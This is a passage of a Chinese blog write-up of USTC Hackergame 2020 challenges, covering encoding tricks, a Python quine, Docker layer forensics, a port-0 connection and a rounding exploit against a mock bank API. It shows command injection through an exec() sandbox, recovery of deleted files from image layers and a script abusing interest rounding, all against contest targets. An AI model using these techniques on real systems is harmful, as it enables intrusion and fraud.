代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 